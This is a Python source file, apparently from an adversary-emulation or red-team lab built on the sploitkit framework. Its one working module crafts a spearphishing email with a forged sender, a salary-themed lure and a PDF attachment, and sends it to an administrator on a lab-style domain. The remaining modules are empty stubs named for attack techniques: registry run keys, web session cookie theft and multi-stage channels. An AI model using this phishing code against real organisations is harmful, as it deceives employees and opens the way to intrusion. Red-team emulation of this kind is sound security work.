'''
from sploitkit import *
# Import smtplib for the actual sending function
import smtplib

# For guessing MIME type
import mimetypes

# Import the email modules we'll need
import email
import email.mime
import email.mime.application
from email.mime import multipart
from email.mime import text
from email.mime.multipart import MIMEMultipart



class SpearphishingAttachment(Module):
	""" T1193

	Author:  your name (your email)
	Version: 1.0
	"""
	def run(self):
		# Create a text/plain message
		msg = email.mime.multipart.MIMEMultipart()
		msg['Subject'] = 'Nuevo programa de sueldos 2021.'
		msg['From'] = 'wwhite@ecorp.local'
		msg['To'] = 'Administrator@ecorp.local'

		# The main body is just another attachment
		body = email.mime.text.MIMEText("""Estimados empleados de ecorp, les hago saber en el siguiente documento sobre los cambios que tendremos en las nómina​s y los sueldos para el año entrante.
		Saludos, y excelente fin de año!
		Walter White
		Director General
		""")
		msg.attach(body)

		# Attach PDF 
		filename='plan2021.pdf'
		fp=open(filename,'rb')
		att = email.mime.application.MIMEApplication(fp.read(),_subtype="pdf")
		fp.close()
		att.add_header('Content-Disposition','attachment',filename=filename)
		msg.attach(att)

		s = smtplib.SMTP(host='ecorp.local')
		s.sendmail('wwhite@ecorp.local',['Administrator@ecorp.local'], msg.as_string())
		s.quit()

		pass
'''
"""

class RegistryRunKeys(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass



class StealWebSessionCookie(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass


class MultiStageChannels(Module):
	\""" Description here 

	Author:  your name (your email)
	Version: 1.0
	\"""
	def run(self):
		pass

"""